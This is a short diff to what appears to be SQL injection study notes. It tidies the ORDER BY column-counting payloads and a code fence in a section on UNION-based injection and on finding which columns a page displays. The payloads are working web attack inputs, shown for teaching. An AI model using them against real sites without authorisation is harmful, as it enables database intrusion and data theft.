@@ -119,8 +119,8 @@ Using ORDER BY
 ' order by 1-- 
 # This should return a normal looking table ordered by the 1st column
 # Now we increase the column number until it breaks
-' order by 2-- ;
-' order by 3-- ;
+' order by 2-- 
+' order by 3-- 
 # When the query breaks by either showing an error or showing nothing, you will know the number of columns
 # was the last number that worked. 
 ```
@@ -131,6 +131,7 @@ Using UNION
 cn' UNION select 1,2,3-- 
 cn' UNION select 1,2,3,4-- 
 # We will get an error or no results until we hit the right number of columns
+```
 ### Determining which columns are displayed to the page
 It is very common that not all columns are displayed to the user.
 Very important to figure out which columns are displayed so you know where to put your injection to get it displayed
